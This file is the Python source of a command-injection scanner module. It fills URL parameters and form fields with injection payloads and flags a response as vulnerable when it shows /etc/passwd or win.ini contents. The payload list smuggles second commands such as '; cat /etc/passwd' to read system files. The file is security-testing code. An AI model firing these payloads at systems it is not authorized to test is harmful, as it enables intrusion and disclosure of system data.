import logging
import urllib.parse
from urllib.parse import urlencode
from scanner_engine.utils import format_http_request, format_http_response

logger = logging.getLogger(__name__)

class CommandInjectionScanner:
    def __init__(self, session, on_vuln=None):
        self.session = session
        self.on_vuln = on_vuln
        # High-fidelity payloads only to prevent False Positives (Reflected Input)
        self.payloads = [
            "; type C:\\Windows\\win.ini",
            "| type C:\\Windows\\win.ini",
            "& type C:\\Windows\\win.ini",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            # Polyglots
            "127.0.0.1; cat /etc/passwd",
            "127.0.0.1 | cat /etc/passwd"
        ]
        self.signatures = [
            "[extensions]", # win.ini section
            "root:x:0:0", # passwd signature
            "daemon:x:", # passwd signature
            "[fonts]", # win.ini section
            "mysql:x:" # common user
        ]
        
    def scan_url(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return
            
        base_url = url.split('?')[0]
        
        for param, values in params.items():
            for payload in self.payloads:
                # Construct query with injection
                # We replace the parameter value entirely or append? 
                # Appending is safer for "ping" style inputs (e.g. 8.8.8.8; ls)
                
                # Test 1: Replace
                test_params = params.copy()
                test_params[param] = payload
                try:
                    # manual encode to ensure payload chars aren't double-encoded aggressively by requests params
                    # actually requests handles it, but for cmdi we want raw chars often
                    resp = self.session.get(base_url, params=test_params, timeout=20)
                    if self._analyze(resp, param, payload, url): break
                except:
                    pass

    def scan_form(self, form):
        action = form.get('action')
        inputs = form.get('inputs', [])
        method = form.get('method', 'GET').upper()
        
        target_inputs = [i for i in inputs if i.get('name') and i.get('type') not in ['hidden', 'submit', 'button']]
        
        for input_field in target_inputs:
            input_name = input_field.get('name')
            
            for payload in self.payloads:
                # Prep data
                data = {}
                submit_found = False
                for i in inputs:
                    if i.get('name'):
                        nm = i.get('name')
                        val = i.get('value', '') # Use extracted value if available (requires crawler update, but safe placeholder)
                        
                        if 'submit' in nm.lower():
                             submit_found = True
                             data[nm] = val if val else 'Submit'
                        elif 'ip' in nm.lower(): 
                             data[nm] = '127.0.0.1'
                        elif 'email' in nm.lower(): 
                             data[nm] = 'test@test.com'
                        else: 
                             data[nm] = 'test'
                
                # Force Submit if not found but typical for DVWA
                if not submit_found:
                    data['Submit'] = 'Submit'

                # Inject
                data[input_name] = payload
                
                try:
                    if method == 'POST':
                        resp = self.session.post(action, data=data, timeout=20)
                    else:
                        resp = self.session.get(action, params=data, timeout=20)
                    
                    if self._analyze(resp, input_name, payload, action): break
                except Exception as e:
                    # logger.debug(f"CMDI Error: {e}")
                    pass

    def _analyze(self, resp, param, payload, endpoint):
         for sig in self.signatures:
             if sig in resp.text:
                 vuln = {
                     "name": "Command Injection (RCE)",
                     "severity": "Critical",
                     "endpoint": endpoint,
                     "parameter": param,
                     "payload": payload,
                     "evidence": f"Found signature '{sig}' in response body.",
                     "owasp_reference": "https://owasp.org/www-community/attacks/Command_Injection",
                     "owasp_id": "A03:2021-Injection",
                     "request": format_http_request(resp.request),
                     "response": format_http_response(resp)
                 }
                 if self.on_vuln:
                     self.on_vuln(vuln)
                 return True
         return False
